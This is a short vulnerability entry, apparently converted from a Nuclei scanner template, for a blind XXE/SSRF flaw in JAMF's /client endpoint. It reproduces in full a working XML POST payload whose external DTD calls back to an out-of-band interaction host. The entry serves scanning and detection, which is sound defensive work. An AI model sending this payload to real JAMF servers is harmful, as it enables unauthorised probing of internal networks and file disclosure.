# Vulnerability: JAMF Blind XXE / SSRF
**Classification:** CWE-611,CWE-918
**Source:** Nuclei Template (`jamf-blind-xxe.yaml`)

## Description
Blind XXE / SSRF exists in JAMF which is a company that provides enterprise-level software solutions for managing and securing Apple devices in organizations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /client HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml

<?xml version='1.0' encoding='UTF-8' standalone="no"?>
<!DOCTYPE jamfMessage SYSTEM "http://{{interactsh-url}}/test.xml">
<ns2:jamfMessage xmlns:ns3="http://www.jamfsoftware.com/JAMFCommunicationSettings" xmlns:ns2="http://www.jamfsoftware.com/JAMFMessage">
  <device>
    <uuid>&test;</uuid>
    <macAddresses />
  </device>
  <application>com.jamfsoftware.jamfdistributionserver</application>
  <messageTimestamp>{{unix_time()}}</messageTimestamp>
  <content xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="ns2:ResponseContent">
    <uuid>00000000-0000-0000-0000-000000000000</uuid>
    <commandType>com.jamfsoftware.jamf.distributionserverinventoryrequest</commandType>
    <status>
      <code>1999</code>
      <timestamp>{{unix_time()}}</timestamp>
    </status>
    <commandData>
      <distributionServerInventory>
        <ns2:distributionServerID>34</ns2:distributionServerID>
      </distributionServerInventory>
    </commandData>
  </content>
</ns2:jamfMessage>
```

